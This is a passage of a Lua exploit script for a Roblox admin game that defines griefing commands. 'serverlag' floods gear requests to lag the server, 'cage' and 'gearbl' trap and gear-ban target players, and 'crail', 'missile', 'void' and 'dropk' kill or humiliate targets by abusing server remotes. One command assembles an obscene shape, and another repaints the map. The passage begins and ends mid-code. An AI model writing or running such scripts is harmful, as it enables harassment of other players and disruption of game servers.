					v.Parent = game.Players.LocalPlayer.Character
				end)
			end)()
		end

		for _, v in pairs(ws["Obby Box"]:GetDescendants()) do 
			if v:IsA("Part") then 
				v.CanCollide = false 
			end 
		end


		local cf = CFrame.new(Vector3.new(0,-4,0))

		local segments = 100


		local radius = 15
		local Positions = {}
		local single = 360/segments

		for i = 1, segments do
			local angle = single*i*2
			local cheating = cf * CFrame.Angles(0,math.rad(angle),0)
			table.insert(Positions, cheating.Position + cheating.LookVector * radius)
		end
		--wait(.7)
		for i,v in pairs(plr.Character:GetChildren()) do
			if v:IsA("Tool") then
				coroutine.wrap(function()
					pcall(function()
						v.GripPos = Positions[i]
						task.wait()
						v.Parent = plr.Character
					end)
				end)()
			end
		end
		for i = 1, #Positions do 
			table.remove(Positions,i)
		end




	end)

	addcommand("fixvel",
		"fixes velocity",
		function()
			local Game_Folder = game:GetService("Workspace").Terrain["_Game"]
			local Workspace_Folder = Game_Folder.Workspace
			local Admin_Folder = Game_Folder.Admin
			workspace.Terrain._Game.Workspace.Baseplate.Velocity = Vector3.new(0,0,0)
			workspace.Terrain._Game.Workspace.Baseplate.RotVelocity = Vector3.new(0,0,0) 
			for i, v in pairs(game:GetService("Workspace").Terrain["_Game"].Workspace["Basic House"]:GetChildren()) do
				v.Velocity = Vector3.new(0, 0, 0)
				v.RotVelocity = Vector3.new(0, 0, 0)
			end
			for i, v in pairs(game:GetService("Workspace").Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
				v.Velocity = Vector3.new(0, 0, 0)
				v.RotVelocity = Vector3.new(0, 0, 0)
			end
			for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
				v.Velocity = Vector3.new(0, 0, 0)
				v.RotVelocity = Vector3.new(0, 0, 0)
			end
			for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby Box"]:GetChildren()) do
				v.Velocity = Vector3.new(0, 0, 0)
				v.RotVelocity = Vector3.new(0, 0, 0)
			end
			for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Building Bricks"]:GetChildren()) do
				v.Velocity = Vector3.new(0, 0, 0)
				v.RotVelocity = Vector3.new(0, 0, 0)
			end
			Admin_Folder.Regen.Velocity = Vector3.new(0, 0, 0)
			Admin_Folder.Regen.RotVelocity = Vector3.new(0, 0, 0)
			for i, v in pairs(game:GetService("Workspace").Terrain["_Game"].Admin.Pads:GetDescendants()) do
				if v.Name == "Head" then
					v.Velocity = Vector3.new(0, 0, 0)
					v.RotVelocity = Vector3.new(0, 0, 0)
				end
			end
			error("Velocity has been fixed!")
		end)

	addcommand("cage",
		"a",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				_G.cagecheck = false
				tchat("gear me 00000000000000000082357101")
				if _G.cagecheck == false then
					_G.cagecheck = true
					repeat task.wait() until plr.Backpack:FindFirstChild('PortableJustice')
					plr.Backpack.PortableJustice.Parent = plr.Character
					repeat task.wait() until game.Workspace[plr.Name].PortableJustice:FindFirstChild('MouseClick')
					local oldpos = plr.Character.HumanoidRootPart.CFrame
					plr.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
					tchat('unff '..Target.Name)
					repeat 
						coroutine.wrap(function()
							game.Workspace[plr.Name].PortableJustice.MouseClick:FireServer(game.Workspace[Target.Name]) 
						end)()
						task.wait() 
					until Target.Character:FindFirstChild('DisableBackpack')
					pcall(function()             
						game.Workspace[plr.Name]["PortableJustice"]:Destroy()
						_G.cagecheck = false
					end)
					plr.Character:WaitForChild("HumanoidRootPart")
					plr.Character.HumanoidRootPart.CFrame = oldpos
				end

			end
		end
	)

	addcommand("gearbl",
		"a",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				_G.cagecheck = false
				tchat("gear me 00000000000000000082357101")
				if _G.cagecheck == false then
					_G.cagecheck = true
					repeat task.wait() until plr.Backpack:FindFirstChild('PortableJustice')
					plr.Backpack.PortableJustice.Parent = plr.Character
					repeat task.wait() until game.Workspace[plr.Name].PortableJustice:FindFirstChild('MouseClick')
					local oldpos = plr.Character.HumanoidRootPart.CFrame
					plr.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame
					tchat('unff '..Target.Name)
					repeat 
						coroutine.wrap(function()
							game.Workspace[plr.Name].PortableJustice.MouseClick:FireServer(game.Workspace[Target.Name]) 
						end)()
						task.wait() 
					until Target.Character:FindFirstChild('DisableBackpack')
					coroutine.wrap(function()
						tchat('reset me')
						tchat('reset '..Target.Name)
						_G.cagecheck = false
						Target.CharacterAdded:Wait()
						tchat("pm/"..Target.Name.."/get gearbanned lol")
					end)()
					plr.CharacterAdded:wait()
					plr.Character:WaitForChild("HumanoidRootPart")
					plr.Character.HumanoidRootPart.CFrame = oldpos
				end

			end
		end
	)	


	addcommand("distort",
		"a",
		function()
			for _, v in next, game.Workspace:GetDescendants() do 
				if v:IsA("Sound") and v.Parent == Folder then 

					for i = 1, 1000,1 do 
						v.TimePosition = i 
						task.wait(.1)
					end
				end 
			end
		end)


	addcommand("rk",
		"a",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				if Target.Name ~= game.Players.LocalPlayer.Name then
					for _, v in pairs(plr.Character:GetDescendants()) do 
						if v:IsA("Part") or v:IsA("BasePart") then 
							v.CanCollide = false
						end 
					end 
					tchat("invis me")
					task.wait(.1)
					tchat("fly "..Target.Name)
					task.wait(.3)
					for _, v in pairs(Target.Character:GetDescendants()) do 
						if v:IsA("Part") or v:IsA("BasePart") then 
							v.CanCollide = false 
						end 
					end

					for i = 1, 120 do 
						task.wait()
						for i = 1, 25 do 
							tchat("rocket/me,"..Target.Name.."/me,"..Target.Name.."/me,"..Target.Name)
							plr.Character:WaitForChild("HumanoidRootPart").CFrame = Target.Character:WaitForChild("HumanoidRootPart").CFrame * CFrame.fromEulerAnglesXYZ(0, math.rad(180), 0) - Target.Character:WaitForChild("HumanoidRootPart").CFrame.LookVector * 2.5
						end 
					end
					tchat("reset me")
				end 
			end
		end
	)





	addcommand("dropk",
		"a",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				plrpos = plr.Character.HumanoidRootPart.CFrame 
				tchat("fly me")
				tchat("music 879817365")
				coroutine.wrap(function()
					task.wait(1.5)
					tchat("music")
				end)()
				task.wait(.6)
				plr.Character.HumanoidRootPart.CFrame = CFrame.new(-45, 24, 10)
				task.wait(.5)
				tchat("tp "..Target.Name.." me")
				coroutine.wrap(function()
					task.wait(.6)
					plr.Character.HumanoidRootPart.CFrame = plrpos 
					tchat("unfly me")

				end)()
				local dead = false
				local io = 1
				while io < 200 do 
					task.wait()
					io = io + 1
					if Target.Character.Humanoid.Health == 0 then
						dead = true 
					end 
				end 
				if dead == false then 
					tchat("h/You thought you would get away with it..")
					task.wait(1)
					tchat("void "..Target.Name)
					task.wait(0.6)
					tchat("smack "..Target.Name)
					Target.CharacterAdded:Wait()
					tchat("removehats "..Target.Name)
					tchat("music 1838278111")
					tchat("hat "..Target.Name.." 4272833564")
					tchat("h/Please welcome our clown, "..Target.Name)
				end

			end 
		end)


	addcommand("void",
		"a",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do

				plrpos = plr.Character.HumanoidRootPart.CFrame 
				tchat("fly me")
				task.wait(.5)
				plr.Character.HumanoidRootPart.CFrame = CFrame.new(-61, -52, -4)
				task.wait(.3)
				tchat("tp "..Target.Name.." me")
				tchat("unfly "..Target.Name)
				task.wait(.5)
				plr.Character.HumanoidRootPart.CFrame = plrpos 
				tchat("unfly me")
			end
		end)


	--safejoin








	addcommand("crail",
		"desc",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				local amount = 0
				local playertarg = Target.Name
				repeat
					amount = 0
					tchat("gear me "..string.rep("0", math.random(50, 100)).."79446473")
					for i, v in pairs(plr.Backpack:GetChildren()) do
						if v.Name == "Railgun" then
							amount = amount +1
						end
					end
					game:GetService("RunService").Heartbeat:wait()
				until amount >= 100
				task.wait(.2)
				local tppos = true
				local grav = game.Workspace.Gravity
				tchat("invis me")
				tchat("ungod "..playertarg)
				tchat("speed "..playertarg.." 0")
				tchat("unff "..playertarg)
				wait(.2)
				spawn(function()
					while tppos == true do
						plr.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(Vector3.new(0, 10, 0))		
						for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
							if v:IsA("Part") then
								v.CanCollide = false
							end
						end	
						game.Workspace.Gravity = 0
						if tppos == false then break end
						game:GetService("RunService").Heartbeat:wait()
					end
				end)
				local cf = CFrame.new(Vector3.new(0,4,0))
				local segments = 100
				local radius = 25
				local Positions = {}
				local single = 360/segments

				for i = 1, segments do
					local angle = single*i
					local cheating = cf * CFrame.Angles(0,math.rad(angle),0)
					table.insert(Positions, cheating.Position + cheating.LookVector * radius)
				end
				wait(1)
				for i,v in pairs(plr.Backpack:GetChildren()) do
					coroutine.wrap(function()
						pcall(function()
							v.Parent = plr.Character
							v.GripPos = Positions[i]
						end)
					end)()
				end
				wait(1)
				for i,v in pairs(plr.Character:GetChildren()) do
					if v:IsA("Tool") then 
						local player = game.Players.LocalPlayer
						local Mouse = player:GetMouse()
						local num = math.random(1,6)
						local te = Target.Character
						local partcheck = {te:FindFirstChild("Right Leg"), te:FindFirstChild("Left Leg"), te:FindFirstChild("Head") ,te:FindFirstChild("Left Arm") ,te:FindFirstChild("Right Arm"), te:FindFirstChild("HumanoidRootPart"), te:FindFirstChild("Torso")}
						local target = partcheck[math.random(1, #partcheck)]
						local args = {
							[1] = te.HumanoidRootPart.Position 
						}

						v.Click:FireServer(unpack(args))
					end
				end
				wait(.1)
				tppos = false
				wait(.1)
				tchat("unname "..playertarg)
				tchat("vis me")
				tchat("ungear me")
				game.Workspace.Gravity = grav
			end
		end)

	addcommand("missile",
		"desc",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				local amount = 0
				local playertarg = Target.Name
				repeat
					amount = 0
					tchat("gear me "..string.rep("0", math.random(50, 100)).."67747912")
					for i, v in pairs(plr.Backpack:GetChildren()) do
						if v.Name == "LockonLauncher" then
							amount = amount +1
						end
					end
					game:GetService("RunService").Heartbeat:wait()
				until amount >= 100
				task.wait(.2)
				local tppos = true
				local grav = game.Workspace.Gravity
				tchat("invis me")
				tchat("ungod "..playertarg)
				tchat("speed "..playertarg.." 0")
				tchat("unff "..playertarg)
				wait(.2)
				spawn(function()
					while tppos == true do
						plr.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(Vector3.new(0, 10, 0))		
						for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
							if v:IsA("Part") then
								v.CanCollide = false
							end
						end	
						game.Workspace.Gravity = 0
						if tppos == false then break end
						game:GetService("RunService").Heartbeat:wait()
					end
				end)
				local cf = CFrame.new(Vector3.new(0,4,0))
				local segments = 100
				local radius = 25
				local Positions = {}
				local single = 360/segments

				for i = 1, segments do
					local angle = single*i
					local cheating = cf * CFrame.Angles(0,math.rad(angle),0)
					table.insert(Positions, cheating.Position + cheating.LookVector * radius)
				end
				wait(1)
				for i,v in pairs(plr.Backpack:GetChildren()) do
					coroutine.wrap(function()
						pcall(function()
							v.Parent = plr.Character
							v.GripPos = Positions[i]
						end)
					end)()
				end
				wait(1)
				for i,v in pairs(plr.Character:GetChildren()) do
					if v:IsA("Tool") then 
						local player = game.Players.LocalPlayer
						local Mouse = player:GetMouse()
						local num = math.random(1,6)
						local te = Target.Character
						local partcheck = {te:FindFirstChild("Right Leg"), te:FindFirstChild("Left Leg"), te:FindFirstChild("Head") ,te:FindFirstChild("Left Arm") ,te:FindFirstChild("Right Arm"), te:FindFirstChild("HumanoidRootPart"), te:FindFirstChild("Torso")}
						local target = partcheck[math.random(1, #partcheck)]
						local args = {
							[1] = te.HumanoidRootPart.Position
						}
						game:GetService("Players").LocalPlayer.Character.LockonLauncher.Remote:FireServer(unpack(args))

					end
				end
				wait(.1)
				tppos = false
				wait(.1)
				tchat("unname "..playertarg)
				tchat("vis me")
				tchat("ungear me")
				game.Workspace.Gravity = grav
			end
		end)

	local players = game.Players

	addcommand("serverlag",
		"desc",
		function()
			for i = 1, tonumber(args[2]) do 
				task.wait()
				for i = 1, 10 do
					tchat("gear me 000000000000000000000000000000000000000000000000000253519495")
				end
			end
		end)


	addcommand("rcrail",
		"desc",
		function()
			for _Index, Target in pairs(GetPlayer(args[2])) do
				tchat("ungear me")
				task.wait(.2)
				local amount = 0
				local playertarg = Target.Name
				repeat
					amount = 0
					tchat("gear me "..string.rep("0", math.random(50, 100)).."79446473")
					for i, v in pairs(players.LocalPlayer.Backpack:GetChildren()) do
						if v.Name == "Railgun" then
							amount = amount +1
						end
					end
					game:GetService("RunService").Heartbeat:wait()
				until amount >= 100
				task.wait(.2)
				local tppos = true
				local grav = game.Workspace.Gravity
				tchat("invis me")
				tchat("ungod "..playertarg)
				tchat("speed "..playertarg.." 0")
				tchat("unff "..playertarg)
				wait(.2)
				spawn(function()
					while tppos == true do
						game.Players.LocalPlayer.Character.HumanoidRootPart.CFrame = Target.Character.HumanoidRootPart.CFrame * CFrame.new(Vector3.new(0, 10, 0))		
						for i, v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
							if v:IsA("Part") then
								v.CanCollide = false
							end
						end	
						game.Workspace.Gravity = 0
						if tppos == false then break end
						game:GetService("RunService").Heartbeat:wait()
					end
				end)
				local cf = CFrame.new(Vector3.new(0,4,0))
				local segments = 100
				local radius = 25
				local Positions = {}
				local single = 360/segments

				for i = 1, segments do
					local angle = single*i
					local cheating = cf * CFrame.Angles(0,math.rad(angle),0)
					table.insert(Positions, cheating.Position + cheating.LookVector * radius)
				end
				wait(1)
				for i,v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do
					coroutine.wrap(function()
						pcall(function()
							v.Parent = game.Players.LocalPlayer.Character
							v.GripPos = Positions[i]
						end)
					end)()
				end
				wait(1)
				for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
					if v:IsA("Tool") then 
						local player = game.Players.LocalPlayer
						local Mouse = player:GetMouse()
						local num = math.random(1,6)
						local te = Target.Character
						local partcheck = {te:FindFirstChild("Right Leg"), te:FindFirstChild("Left Leg"), te:FindFirstChild("Head") ,te:FindFirstChild("Left Arm") ,te:FindFirstChild("Right Arm"), te:FindFirstChild("HumanoidRootPart"), te:FindFirstChild("Torso")}
						local target = partcheck[math.random(1, #partcheck)]
						local args = {
							[1] = te.HumanoidRootPart.Position 
						}

						v.Click:FireServer(unpack(args))
					end
				end
				tchat("gear me 000000000000000000000000000000000000000000000000000018474459")
				task.wait(.3)
				game.Players.LocalPlayer.Character.Humanoid:EquipTool(game.Players.LocalPlayer.Backpack.PaintBucket)
				task.wait(.3)
				for i,v in pairs(game.Players.LocalPlayer.Character:GetChildren()) do
					if v.Name == "PaintBucket" then
						v.GripPos = game.Players.LocalPlayer.Character.HumanoidRootPart.Position - Vector3.new(0, 5, 0)
					end
				end
				_G.crail = true
				wait(.2)
				local speed = 32
				while _G.crail == true do
					for i = 0,1,0.001*speed do task.wait()
						local clr = Color3.fromHSV(i,1,1)
						--local padss = ws.Terrain["_Game"]:GetDescendants()
						for i, v in pairs(game.Workspace:GetDescendants()) do
							coroutine.wrap(function()
								if v.Name == "Rail" or v.Name == "Effect" then
									local v1 =
										{
											["Part"] = v,
											["Color"] = clr
										}
									game:GetService("Players").LocalPlayer.Character.PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", v1)
								end
							end)()
						end
						wait(1 / 12) -- recolor the map x times a second lol.
					end
					task.wait(1)
					_G.crail = false
					game.Workspace.Gravity = grav
				end
				task.wait(.1)
				tppos = false
				wait(.1)
				tchat("unname "..playertarg)
				tchat("vis me")
				game.Workspace.Gravity = grav
			end
		end)

	addcommand("g/c", -- cock script
		"desc",
		function()
			local cockamount = 450;

			repeat task.wait(.1)
				hasenoughcocks = false

				gearid = '356212933'
				toolname = 'SteampunkSteamGun'





				for i = 1, math.ceil(cockamount/3) do 
					task.wait()
					tchat("gear me "..gearid)
				end

				for i, v in pairs(game.Players.LocalPlayer.Backpack:GetChildren()) do 
					if i >= cockamount then
						hasenoughcocks = true
					end
				end

			until hasenoughcocks == true



			repeat     task.wait()
				tchat("gear me 34399428")
			until plr.Backpack:FindFirstChild("ConfettiCannon")



			loop = cockamount / 7 -- amount of guns used on each angle, dont need to change


			local ballradius = 1
			local cockradius = 0.7

			-- jesus christ

			local lp = game.Players.LocalPlayer
			local Position = lp.Character.HumanoidRootPart.CFrame


			for i = 1, loop do
				tool = lp.Backpack:FindFirstChild(toolname)
				tool.GripPos = Vector3.new((ballradius * math.cos(i) + 0),(ballradius * math.sin(i) + 2), tool.Handle.Position.Z + -21)
				tool.Parent = lp.Character
			end

			for i = 1, loop do
				tool = lp.Backpack:FindFirstChild(toolname)
				tool.GripPos = Vector3.new((ballradius * math.cos(i) + 3),(ballradius * math.sin(i) + 2), tool.Handle.Position.Z + -21)
				tool.Parent = lp.Character
			end

			for i = 1, loop do
				tool = lp.Backpack:FindFirstChild(toolname)
				tool.GripPos = Vector3.new((ballradius * math.cos(i) + 1.5),(cockradius * math.sin(i) + 2), tool.Handle.Position.Z + -21)
				tool.Parent = lp.Character
			end


			for i = 1, loop do
				tool = lp.Backpack:FindFirstChild(toolname)
				tool.GripPos = Vector3.new((cockradius * math.cos(i) + 1.5),(cockradius * math.sin(i) + 2), tool.Handle.Position.Z + -18)
				tool.Parent = lp.Character
				tool.Handle.Velocity = Vector3.new(1000, 1000, 10000)
			end

			for i = 1, loop do
				tool = lp.Backpack:FindFirstChild(toolname)
				tool.GripPos = Vector3.new((cockradius * math.cos(i) + 1.5),(cockradius * math.sin(i) + 2), tool.Handle.Position.Z + -15)
				tool.Parent = lp.Character
				tool.Handle.Velocity = Vector3.new(1000, 1000, 10000)
			end

			for i = 1, loop do
				tool = lp.Backpack:FindFirstChild(toolname)
				tool.GripPos = Vector3.new((cockradius * math.cos(i) + 1.5),(cockradius * math.sin(i) + 2), tool.Handle.Position.Z + -12)
				tool.Parent = lp.Character
				tool.Handle.Velocity = Vector3.new(1000, 1000, 10000)
			end

			tool = lp.Backpack:FindFirstChild("ConfettiCannon")
			tool.GripPos = Vector3.new((1 * math.cos(1) + 1),(cockradius * math.sin(1) + 1.7), tool.Handle.Position.Z + 12.5)
			tool.Parent = lp.Character
			tool.Handle.Velocity = Vector3.new(1000, 1000, 10000)











		end)   

	addcommand("dfcolour",
		"desc",
		function()
			colorAPI = {}

			colorAPI.color = function(Part, color)
				local thread = coroutine.create(function() -- x3.5 speed boost
					local Arguments =
						{
							["Part"] = Part,
							["Color"] = color
						}
					game:GetService("Workspace")[game:GetService("Players").LocalPlayer.Name].PaintBucket:WaitForChild("Remotes").ServerControls:InvokeServer("PaintPart", Arguments)
				end)
				coroutine.resume(thread)
			end

			colorAPI.transformToColor3 = function(col)
				local r = col.r
				local g = col.g
				local b = col.b
				return Color3.new(r,g,b);
			end

			-- colorAPI.Color3 = function(brickColor)
			--     return colorAPI.transformToColor3(BrickColor.new(brickColor))
			-- end

			colorAPI.colorObbyBox = function(color) -- Default is "Teal"
				for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby Box"]:GetChildren()) do
					colorAPI.color(v, color) -- colorAPI.transformToColor3(BrickColor.new("Bright red"))
				end
			end

			colorAPI.colorObbyBricks = function(color)-- Default is "Really red"
				for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Obby"]:GetChildren()) do
					colorAPI.color(v, color)
				end
			end

			colorAPI.colorAdminDivs = function(color)-- Default is "Dark stone grey"
				for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Admin Dividers"]:GetChildren()) do
					colorAPI.color(v, color)
				end
			end

			colorAPI.colorPads = function(color)-- Default is "Bright green"
				for i,v in pairs(game.Workspace.Terrain["_Game"].Admin["Pads"]:GetChildren()) do
					colorAPI.color(v.Head, color)
				end
			end

			colorAPI.colorHouse = function(arg)
				local wallsC = arg.wallsC
				local baseC = arg.baseC
				local roofC = arg.roofC
				local WANDDC = arg.WANDDC
				local stairsC = arg.stairsC
				local floorC = arg.floorC
				local rooftsC = arg.rooftsC
				local chiC = arg.chiC

				-------------------------------------------------------------------- House (really messy ik) --------------------------------------------------------------------

				for i,v in pairs(game.Workspace.Terrain["_Game"].Workspace["Basic House"]:GetChildren()) do
					coroutine.wrap(function()
						if v.Name == "SmoothBlockModel103" or v.Name == "SmoothBlockModel105" or v.Name == "SmoothBlockModel106" or v.Name == "SmoothBlockModel108" or v.Name == "SmoothBlockModel11" or v.Name == "SmoothBlockModel113" or v.Name == "SmoothBlockModel114" or v.Name == "SmoothBlockModel115" or v.Name == "SmoothBlockModel116" or v.Name == "SmoothBlockModel118" or v.Name == "SmoothBlockModel122" or v.Name == "SmoothBlockModel126" or v.Name == "SmoothBlockModel129" or v.Name == "SmoothBlockModel13" or v.Name == "SmoothBlockModel130" or v.Name == "SmoothBlockModel131" or v.Name == "SmoothBlockModel132" or v.Name == "SmoothBlockModel134" or v.Name == "SmoothBlockModel135" or v.Name == "SmoothBlockModel14" or v.Name == "SmoothBlockModel140" or v.Name == "SmoothBlockModel142" or v.Name == "SmoothBlockModel147" or v.Name == "SmoothBlockModel15" or v.Name == "SmoothBlockModel154" or v.Name == "SmoothBlockModel155" or v.Name == "SmoothBlockModel164" or v.Name == "SmoothBlockModel166" or v.Name == "SmoothBlockModel173" or v.Name == "SmoothBlockModel176" or v.Name == "SmoothBlockModel179" or v.Name == "SmoothBlockModel185" or v.Name == "SmoothBlockModel186" or v.Name == "SmoothBlockModel190" or v.Name == "SmoothBlockModel191" or v.Name == "SmoothBlockModel196" or v.Name == "SmoothBlockModel197" or v.Name == "SmoothBlockModel198" or v.Name == "SmoothBlockModel20" or v.Name == "SmoothBlockModel201" or v.Name == "SmoothBlockModel203" or v.Name == "SmoothBlockModel205" or v.Name == "SmoothBlockModel207" or v.Name == "SmoothBlockModel208" or v.Name == "SmoothBlockModel209" or v.Name == "SmoothBlockModel210" or v.Name == "SmoothBlockModel211" or v.Name == "SmoothBlockModel213" or v.Name == "SmoothBlockModel218" or v.Name == "SmoothBlockModel22" or v.Name == "SmoothBlockModel223" or v.Name == "SmoothBlockModel224" or v.Name == "SmoothBlockModel226" or v.Name == "SmoothBlockModel26" or v.Name == "SmoothBlockModel29" or v.Name == "SmoothBlockModel30" or v.Name == "SmoothBlockModel31" or v.Name == "SmoothBlockModel36" or v.Name == "SmoothBlockModel37" or v.Name == "SmoothBlockModel38" or v.Name == "SmoothBlockModel39" or v.Name == "SmoothBlockModel41" or v.Name == "SmoothBlockModel48" or v.Name == "SmoothBlockModel49" or v.Name == "SmoothBlockModel51" or v.Name == "SmoothBlockModel56" or v.Name == "SmoothBlockModel67" or v.Name == "SmoothBlockModel68" or v.Name == "SmoothBlockModel69" or v.Name == "SmoothBlockModel70" or v.Name == "SmoothBlockModel72" or v.Name == "SmoothBlockModel75" or v.Name == "SmoothBlockModel8" or v.Name == "SmoothBlockModel81" or v.Name == "SmoothBlockModel85" or v.Name == "SmoothBlockModel93" or v.Name == "SmoothBlockModel98" then
							colorAPI.color(v, wallsC) -- Default is "Brick yellow"
						end -- House walls

						if v.Name == "SmoothBlockModel40" then
							colorAPI.color(v, baseC) -- Default is "Bright green"
						end -- House grass base

						if v.Name == "SmoothBlockModel100" or v.Name == "SmoothBlockModel102" or v.Name == "SmoothBlockModel104" or v.Name == "SmoothBlockModel107" or v.Name == "SmoothBlockModel109" or v.Name == "SmoothBlockModel110" or v.Name == "SmoothBlockModel111" or v.Name == "SmoothBlockModel119" or v.Name == "SmoothBlockModel12" or v.Name == "SmoothBlockModel120" or v.Name == "SmoothBlockModel123" or v.Name == "SmoothBlockModel124" or v.Name == "SmoothBlockModel125" or v.Name == "SmoothBlockModel127" or v.Name == "SmoothBlockModel128" or v.Name == "SmoothBlockModel133" or v.Name == "SmoothBlockModel136" or v.Name == "SmoothBlockModel137" or v.Name == "SmoothBlockModel138" or v.Name == "SmoothBlockModel139" or v.Name == "SmoothBlockModel141" or v.Name == "SmoothBlockModel143" or v.Name == "SmoothBlockModel149" or v.Name == "SmoothBlockModel151" or v.Name == "SmoothBlockModel152" or v.Name == "SmoothBlockModel153" or v.Name == "SmoothBlockModel156" or v.Name == "SmoothBlockModel157" or v.Name == "SmoothBlockModel158" or v.Name == "SmoothBlockModel16" or v.Name == "SmoothBlockModel163" or v.Name == "SmoothBlockModel167" or v.Name == "SmoothBlockModel168" or v.Name == "SmoothBlockModel169" or v.Name == "SmoothBlockModel17" or v.Name == "SmoothBlockModel170" or v.Name == "SmoothBlockModel172" or v.Name == "SmoothBlockModel177" or v.Name == "SmoothBlockModel18" or v.Name == "SmoothBlockModel180" or v.Name == "SmoothBlockModel184" or v.Name == "SmoothBlockModel187" or v.Name == "SmoothBlockModel188" or v.Name == "SmoothBlockModel189" or v.Name == "SmoothBlockModel19" or v.Name == "SmoothBlockModel193" or v.Name == "SmoothBlockModel2" or v.Name == "SmoothBlockModel200" or v.Name == "SmoothBlockModel202" or v.Name == "SmoothBlockModel21" or v.Name == "SmoothBlockModel214" or v.Name == "SmoothBlockModel215" or v.Name == "SmoothBlockModel216" or v.Name == "SmoothBlockModel219" or v.Name == "SmoothBlockModel220" or v.Name == "SmoothBlockModel221" or v.Name == "SmoothBlockModel222" or v.Name == "SmoothBlockModel225" or v.Name == "SmoothBlockModel227" or v.Name == "SmoothBlockModel229" or v.Name == "SmoothBlockModel23" or v.Name == "SmoothBlockModel230" or v.Name == "SmoothBlockModel231" or v.Name == "SmoothBlockModel25" or v.Name == "SmoothBlockModel28" or v.Name == "SmoothBlockModel32" or v.Name == "SmoothBlockModel33" or v.Name == "SmoothBlockModel34" or v.Name == "SmoothBlockModel42" or v.Name == "SmoothBlockModel44" or v.Name == "SmoothBlockModel47" or v.Name == "SmoothBlockModel54" or v.Name == "SmoothBlockModel55" or v.Name == "SmoothBlockModel58" or v.Name == "SmoothBlockModel59" or v.Name == "SmoothBlockModel6" or v.Name == "SmoothBlockModel61" or v.Name == "SmoothBlockModel62" or v.Name == "SmoothBlockModel63" or v.Name == "SmoothBlockModel74" or v.Name == "SmoothBlockModel76" or v.Name == "SmoothBlockModel77" or v.Name == "SmoothBlockModel78" or v.Name == "SmoothBlockModel79" or v.Name == "SmoothBlockModel80" or v.Name == "SmoothBlockModel84" or v.Name == "SmoothBlockModel86" or v.Name == "SmoothBlockModel87" or v.Name == "SmoothBlockModel88" or v.Name == "SmoothBlockModel90" or v.Name == "SmoothBlockModel91" or v.Name == "SmoothBlockModel92" or v.Name == "SmoothBlockModel94" or v.Name == "SmoothBlockModel95" or v.Name == "SmoothBlockModel96" then
							colorAPI.color(v, roofC) -- Default is "Bright red"
						end -- House roof

						if v.Name == "SmoothBlockModel10" or v.Name == "SmoothBlockModel101" or v.Name == "SmoothBlockModel117" or v.Name == "SmoothBlockModel121" or v.Name == "SmoothBlockModel144" or v.Name == "SmoothBlockModel145" or v.Name == "SmoothBlockModel146" or v.Name == "SmoothBlockModel148" or v.Name == "SmoothBlockModel150" or v.Name == "SmoothBlockModel159" or v.Name == "SmoothBlockModel161" or v.Name == "SmoothBlockModel171" or v.Name == "SmoothBlockModel174" or v.Name == "SmoothBlockModel175" or v.Name == "SmoothBlockModel181" or v.Name == "SmoothBlockModel182" or v.Name == "SmoothBlockModel183" or v.Name == "SmoothBlockModel192" or v.Name == "SmoothBlockModel194" or v.Name == "SmoothBlockModel195" or v.Name == "SmoothBlockModel199" or v.Name == "SmoothBlockModel204" or v.Name == "SmoothBlockModel206" or v.Name == "SmoothBlockModel212" or v.Name == "SmoothBlockModel217" or v.Name == "SmoothBlockModel228" or v.Name == "SmoothBlockModel24" or v.Name == "SmoothBlockModel27" or v.Name == "SmoothBlockModel35" or v.Name == "SmoothBlockModel4" or v.Name == "SmoothBlockModel43" or v.Name == "SmoothBlockModel45" or v.Name == "SmoothBlockModel46" or v.Name == "SmoothBlockModel50" or v.Name == "SmoothBlockModel53" or v.Name == "SmoothBlockModel57" or v.Name == "SmoothBlockModel60" or v.Name == "SmoothBlockModel64" or v.Name == "SmoothBlockModel65" or v.Name == "SmoothBlockModel66" or v.Name == "SmoothBlockModel7" or v.Name == "SmoothBlockModel71" or v.Name == "SmoothBlockModel73" or v.Name == "SmoothBlockModel82" or v.Name == "SmoothBlockModel83" or v.Name == "SmoothBlockModel89" or v.Name == "SmoothBlockModel99" then
							colorAPI.color(v, WANDDC) -- Default is "Dark orange"
						end -- House windows and door outlines

						if v.Name == "SmoothBlockModel1" or v.Name == "SmoothBlockModel3" or v.Name == "SmoothBlockModel5" or v.Name == "SmoothBlockModel9" then
							colorAPI.color(v, stairsC) -- Default is "Dark stone grey"
						end -- House Stairs

						if v.Name == "SmoothBlockModel112" then
							colorAPI.color(v, floorC) -- Default is "Medium blue"
						end -- House floor

						if v.Name == "SmoothBlockModel52" or v.Name == "SmoothBlockModel97" then
							colorAPI.color(v, rooftsC) -- Default is "Reddish brown"
						end -- House roof thingys

						if v.Name == "SmoothBlockModel160" or v.Name == "SmoothBlockModel162" or v.Name == "SmoothBlockModel165" or v.Name == "SmoothBlockModel178" then
							colorAPI.color(v, chiC) -- Default is "Sand red"
						end -- Chi top part
					end)()
				end
			end

			colorAPI.colorBuildingBricks = function(arg)
				local DarkStoneGrey = arg.DarkStoneGrey
				local DeepBlue = arg.DeepBlue
				local NY = arg.NY
				local IW = arg.IW
				local LimeGreen = arg.LimeGreen
				local MSG = arg.MSG
				local RB = arg.RB
				local RR = arg.RR
				local TP = arg.TP

